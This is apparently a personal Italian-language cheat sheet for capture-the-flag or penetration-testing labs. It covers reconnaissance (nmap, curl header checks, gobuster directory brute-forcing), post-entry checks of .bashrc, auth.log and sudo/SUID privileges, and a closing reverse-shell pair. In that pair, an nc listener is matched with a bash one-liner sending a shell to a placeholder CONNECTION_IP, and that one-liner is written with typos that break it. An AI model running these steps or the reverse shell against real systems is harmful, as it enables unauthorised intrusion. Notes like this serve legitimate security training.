
# prima di entrare

## leggi tutta la documentazione
>[!error] leggi tutto!
> se hai un tool mai visto da utilizzare, o un'exploit scritto da qualcuno, **leggi la documentazione**
### nmap
```bash
nmap -sS -sC -sV ip
```
* `-sO` per Os versioning
* `-sS` per TCP syn scan
* `-sC` esegue script default
* `-sV` interroga porte aperte per ottenere le versioni
### esplora tutte le pagine web dei servizi
> [!error] esplora tutto!
> Quando scopri un'interfaccia web, appunta tutti gli indizi che trovi.

### usa `curl`
guarda l'intestazione http e vedi cosa c'e'!
```bash
curl -I http://website.sborg
```
### esplora le directory
```bash
gobuster dir --url http://[ip address] --wordlist /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt
```
## sql
* `use datbase`
* `SHOW DATABASES`, `SHOW COLUMNS FROM ...`
# quando sono entrato
## Guarda i file log
>[!note] bashrc
> controlla `.bashrc` per gli utenti rilevanti.

`/var/log/auth.log`: contiene le informazioni sui cambi di password.

**MOTD**: Leggi sempre gli **MOTD** quando fai login, o ti connetti a servizi offerti dalla vittima.
## sudo e suid
* `sudo -l` guarda cosa posso fare
* https://gtfobins.org/#//^suid$

## reverse shell
* sulla tua macchina: `nc -lvnp 4444`
* sulla macchina remota: `bash -c 'bash -i > /dev/tpc/CONNECTION_IP/4444 0>&'`